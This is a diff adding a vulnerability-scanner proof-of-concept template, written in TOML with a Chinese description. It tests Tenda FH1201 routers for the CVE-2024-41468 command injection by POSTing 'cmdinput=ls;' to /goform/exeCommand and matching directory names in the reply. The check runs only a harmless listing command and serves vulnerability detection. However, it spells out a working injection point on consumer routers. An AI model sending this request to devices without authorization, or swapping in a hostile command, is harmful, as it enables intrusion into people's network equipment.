@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = "验证 Tenda FH1201 v1.2.0.14 路由器 /goform/exeCommand 接口是否存在 cmdinput 参数命令注入漏洞。通过 POST 发送 cmdinput=ls; 触发后端命令执行，若返回内容包含目录列表特征则判定存在漏洞。该验证仅执行无害的 ls 命令，不破坏目标设备。"
+id = "POC-AVE-2024-0025"
+name = "CVE-2024-41468 Tenda FH1201 命令注入 PoC"
+severity = "critical"
+tags = ["ave-2024-0025"]
+vuln_id = [
+    "CVE-2024-41468",
+    "AVE-2024-0025",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/goform/exeCommand"
+protocol = "http"
+
+[poc.requests.body]
+content = "cmdinput=ls;"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Volume",
+    "tmp",
+    "www",
+    "bin",
+    "etc",
+    "sbin",
+]
